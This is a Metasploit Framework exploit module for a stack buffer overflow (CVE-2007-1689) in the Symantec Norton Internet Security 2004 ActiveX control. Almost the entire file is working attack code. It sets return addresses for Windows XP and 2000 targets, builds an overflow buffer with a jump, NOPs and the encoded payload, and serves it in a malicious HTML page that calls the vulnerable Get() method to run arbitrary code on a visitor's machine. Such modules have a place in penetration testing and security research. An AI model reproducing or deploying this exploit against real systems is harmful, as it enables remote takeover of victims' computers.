##
# $Id: nis2004_get.rb 4645 2007-04-04 04:34:17Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'

module Msf

class Exploits::Windows::Browser::Nis2004_Get < Msf::Exploit::Remote

	include Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Symantec Norton Internet Security 2004 ActiveX Control Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack overflow in the ISAlertDataCOM ActiveX
					Control (ISLAert.dll) provided by Symantec Norton Internet Security 2004.  
					By sending a overly long string to the "Get()" method, an attacker may be 
					able to execute arbitrary code. 
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ], 
			'Version'        => '$Revision: 3783 $',
			'References'     => 
				[
					[ 'CVE', '2007-1689' ],
					[ 'URL', 'http://securityresponse.symantec.com/avcenter/security/Content/2007.05.16.html' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 800,
					'BadChars'      => "\x00\x09\x0a\x0d'\\",
					'PrepenEncoder' => "\x81\xc4\x54\xf2\xff\xff",	
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP0/SP1 Pro English',     { 'Offset' => 272, 'Ret' => 0x71aa32ad } ],
					[ 'Windows 2000 Pro English All',       { 'Offset' => 272, 'Ret' => 0x75022ac4 } ],
				],
			'DisclosureDate' => 'May 16 2007',
			'DefaultTarget'  => 0))
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Randomize some things
		vname	= rand_text_alpha(rand(100) + 1)
		strname	= rand_text_alpha(rand(100) + 1)
		
		# Set the exploit buffer	
		sploit =  rand_text_alpha(target['Offset']) + Rex::Arch::X86.jmp_short(12) 
		sploit << make_nops(2) + [target.ret].pack('V') + p.encoded 
	
		# Build out the message
		content = %Q|
			<html>
			<object classid='clsid:BE39AEFD-5704-4BB5-B1DF-B7992454AB7E' id='#{vname}'></object>
			<script language='javascript'>
			var #{vname} = document.getElementById('#{vname}');
			var #{strname} = new String('#{sploit}');
			#{vname}.Get(#{strname});	
			</script>
			</html>
                  |
		
		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)
		
		# Handle the payload
		handler(cli)
	end

end
end
